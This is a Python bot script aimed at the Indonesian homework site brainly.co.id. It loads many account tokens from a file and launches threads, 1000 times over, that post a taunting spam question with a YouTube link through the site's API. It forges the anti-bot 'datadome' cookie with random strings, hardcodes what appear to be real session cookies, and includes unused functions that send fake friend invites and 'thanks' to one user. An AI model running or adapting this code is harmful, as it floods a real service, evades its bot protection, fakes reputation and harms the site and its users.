import requests,re, threading, string, random
def genRandom(leng):
	char_set = string.ascii_uppercase + string.digits
	return ''.join(random.sample(char_set*6, leng))
	
def msoal(token):
    cookies = {'datadome': genRandom(9) + '-2shclUzf_ZfansDAwMNmquiuxoksG_JgOSTM597sgnJJ.BntlJefemRKCogmA7i~' + genRandom(10) + '~bglWfaB8uYSsOBlEHHIJ1tLsXUsAsMssXc9QfBc03r'}
    headers = {'Host': 'brainly.co.id','x-b-token-long': token,'accept': 'application/json','user-agent': 'Android-App 5.69.1','content-type': 'application/json; charset=UTF-8','content-length': '219'}
    data = '{"attachments":[],"content":"<h1>puk U, OK I WILL LEAK MY SOURCE CODE TO SCRAMBLE BRAINLY DATABASE <br> my channel https://youtube.com/channel/UCSwqED8ekGUyVyDjiaWOv7Q<br>NT: i will stop if i given a role that can remove question","points":10,"subject_id":2}'
    response = requests.post('https://brainly.co.id/api/28/api_tasks/add', headers=headers, cookies=cookies, data=data).text
    if '"is_deleted":false' in response:
    	print('[SOAL] Success Token: ' + token)
    else:
    	print('Failed')
    	
def follow(token):
    cookies = {'_ga': 'GA1.3.1562608605.1637206695','_cc_id': '5b4a28b60d7800ce08cf23ba172dac8a','_hjSessionUser_40312': 'eyJpZCI6IjhjNjBlMTRjLTU2MzMtNWI1My04ZDE3LTlkZmMzZDBhZmVlMiIsImNyZWF0ZWQiOjE2MzcyMjM4NjM1MTMsImV4aXN0aW5nIjp0cnVlfQ==','__gads': 'ID=eb1cf40e8be876c7:T=1637635427:S=ALNI_MZXPs6gnjrLzsHQt88JxElTKoO9SA','_pubcid': '48eb14c4-8051-44ea-81fd-f71df512b683','_gaexp': 'GAX1.3.YpVpjbezSditFSol5ip3UA.19068.1','cf_clearance': 'Z3u8nz8gRtTg6AHxUhi3jg5KJ6Ko3TESDc3.C3kyigc-1641430007-0-250','_gid': 'GA1.3.442944067.1642117089','G_ENABLED_IDPS': 'google','_hjSession_40312': 'eyJpZCI6IjU1M2VhZDQ5LWM2MTYtNDFlYy1iNmE0LWJkNzVmMmM3ZDM0ZCIsImNyZWF0ZWQiOjE2NDIyMDMyOTM1NjYsImluU2FtcGxlIjpmYWxzZX0=','first_visit': '1642203331','authHash': '047ab0561a0042d35b64f6a8a73da906','myHash': '986288eda601aeaf6cd11d08c65dcd2b','datadome': '.2PGpAFMDukTi6FNw7ROeno.7hu9ilJpyIKznkASfjxNWZjbRrR5v81uRvAKZ5Uq4c_e7mfqFS4TP_ughSo85VN.86UB.LX6D48xiBIkQzmiTjbIHkrMyP.d.e5bO~f4'}
    #'Y0ryQhmF0lCRtBu7JhBj1svHkybuBPONgz9Vf0NS4F0='
    headers = {'Host': 'brainly.co.id','content-length': '212','user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Safari/537.36','content-type': 'application/json','x-b-token-long': token,'accept': 'application/json','save-data': 'on','origin': 'https://brainly.co.id','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://brainly.co.id/app/profile/34626350/answers'}
    data = '{"operationName":"InviteToFriends","variables":{"input":{"invitedUserDatabaseId":34626350}},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"6e045dd537b48f29b22eb7fccac8edf76e1ac768922545ad4516d6f421ba46fd"}}}'
    response = requests.post('https://brainly.co.id/graphql/id', headers=headers, cookies=cookies, data=data)
    print(response.text)
    
def thanks(token):
    cookies = {'_ga': 'GA1.3.1562608605.1637206695','_cc_id': '5b4a28b60d7800ce08cf23ba172dac8a','_hjSessionUser_40312': 'eyJpZCI6IjhjNjBlMTRjLTU2MzMtNWI1My04ZDE3LTlkZmMzZDBhZmVlMiIsImNyZWF0ZWQiOjE2MzcyMjM4NjM1MTMsImV4aXN0aW5nIjp0cnVlfQ==','__gads': 'ID=eb1cf40e8be876c7:T=1637635427:S=ALNI_MZXPs6gnjrLzsHQt88JxElTKoO9SA','_pubcid': '48eb14c4-8051-44ea-81fd-f71df512b683','_gaexp': 'GAX1.3.YpVpjbezSditFSol5ip3UA.19068.1','cf_clearance': 'Z3u8nz8gRtTg6AHxUhi3jg5KJ6Ko3TESDc3.C3kyigc-1641430007-0-250','_gid': 'GA1.3.442944067.1642117089','G_ENABLED_IDPS': 'google','_hjSession_40312': 'eyJpZCI6IjU1M2VhZDQ5LWM2MTYtNDFlYy1iNmE0LWJkNzVmMmM3ZDM0ZCIsImNyZWF0ZWQiOjE2NDIyMDMyOTM1NjYsImluU2FtcGxlIjpmYWxzZX0=','first_visit': '1642203331','authHash': '047ab0561a0042d35b64f6a8a73da906','myHash': '986288eda601aeaf6cd11d08c65dcd2b','datadome': '.2PGpAFMDukTi6FNw7ROeno.7hu9ilJpyIKznkASfjxNWZjbRrR5v81uRvAKZ5Uq4c_e7mfqFS4TP_ughSo85VN.86UB.LX6D48xiBIkQzmiTjbIHkrMyP.d.e5bO~f4'}
    #'Y0ryQhmF0lCRtBu7JhBj1svHkybuBPONgz9Vf0NS4F0='
    headers = {'Host': 'brainly.co.id','content-length': '212','user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Safari/537.36','content-type': 'application/json','x-b-token-long': token,'accept': 'application/json','save-data': 'on','origin': 'https://brainly.co.id','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://brainly.co.id/app/profile/34626350/answers'}
    data = '{"operationName":"ThankUser","variables":{"input":{"thankedUserDatabaseId":34626350}},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"9091b00f76659c6c76aeb7d6371f4f50d863e7ea2a69cd08c004cc2ce352b7e6"}}}'
    response = requests.post('https://brainly.co.id/graphql/id', headers=headers, cookies=cookies, data=data)
    print(response.text)
    
a = open('brainlybot.txt', 'r').read()

for zz in range(0,1000):
	for i in a.split('\n'):
		if len(i) != 0:
			token = i.split('Token: (')[1].split(')')[0]
			t = threading.Thread(target=msoal, args=[token])
			t.start()
			
